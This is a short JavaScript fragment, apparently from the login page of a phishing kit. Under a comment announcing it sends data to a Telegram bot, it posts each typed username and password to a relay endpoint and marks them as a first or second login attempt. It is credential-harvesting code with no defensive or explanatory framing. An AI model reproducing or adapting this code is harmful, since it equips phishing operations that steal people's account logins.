      // === SEND DATA TO TELEGRAM BOT ===
      fetch('/api/send-message', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username,
          password,
          attempt: attemptCount.current === 0 ? 'first' : 'second',
          type: 'login_attempt',
        }),
      });
      // ===================================
